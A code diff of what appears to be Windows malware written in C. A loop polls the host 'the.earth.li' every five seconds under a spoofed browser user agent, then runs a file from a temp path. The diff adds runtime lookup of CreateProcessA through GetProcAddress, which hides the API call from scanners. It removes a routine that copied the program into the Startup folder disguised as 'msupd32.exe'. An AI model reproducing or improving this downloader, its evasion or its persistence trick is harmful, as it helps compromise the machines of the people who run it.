@@ -10,7 +10,21 @@
 #pragma comment(lib, "urlmon")
 #pragma comment(lib, "Shlwapi")
 
-void drop();
+
+
+typedef BOOL (WINAPI *CREATEPROC)(
+  __in_opt     LPCTSTR lpApplicationName,
+  __inout_opt  LPTSTR lpCommandLine,
+  __in_opt     LPSECURITY_ATTRIBUTES lpProcessAttributes,
+  __in_opt     LPSECURITY_ATTRIBUTES lpThreadAttributes,
+  __in         BOOL bInheritHandles,
+  __in         DWORD dwCreationFlags,
+  __in_opt     LPVOID lpEnvironment,
+  __in_opt     LPCTSTR lpCurrentDirectory,
+  __in         LPSTARTUPINFO lpStartupInfo,
+  __out        LPPROCESS_INFORMATION lpProcessInformation
+);
+
 int poll();
 
 wchar_t sPollUrl[] = L"the.earth.li";
@@ -18,14 +32,13 @@ wchar_t sUserAgent[] = L"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 
 
 int main()
 {
-	drop();
-
 	while(1)
 	{
 		poll();
 		Sleep(5000);
 	}
 }
+
 
 int poll()
 {
@@ -95,7 +108,8 @@ int poll()
 	STARTUPINFO sinfo = {0};
 	PROCESS_INFORMATION pinfo = {0};
 
-	CreateProcess(NULL,
+	CREATEPROC fpCreateProcess = (CREATEPROC)GetProcAddress(GetModuleHandle("kernel32"), "CreateProcessA");
+	fpCreateProcess(NULL,
 		TmpPath,
 		NULL,
 		NULL,
@@ -108,31 +122,6 @@ int poll()
 
 	ExitProcess(0);
 
-
-
 	return 1;
-
-}
-void drop()
-{
-	PIDLIST_ABSOLUTE ppidl;
-	LPSTR StartupPath = (LPSTR)malloc(MAX_PATH);
-	LPSTR ExePath = (LPSTR)malloc(MAX_PATH);
-
-
-	memset(StartupPath, 0x0, MAX_PATH);
-	memset(ExePath, 0x0, MAX_PATH);
-
-	HRESULT ret = SHGetFolderLocation(NULL, CSIDL_STARTUP, NULL, 0, &ppidl);
-	SHGetPathFromIDList(ppidl, StartupPath);
-
-	if (!GetModuleFileName(NULL, ExePath, MAX_PATH))
-		return;
-
-	if (!StrStrI(ExePath, StartupPath)) // se non chiamato da Startup, copio.
-	{
-		strcat(StartupPath, "\\msupd32.exe");
-		CopyFile(ExePath, StartupPath, FALSE);
-	}
 }
 
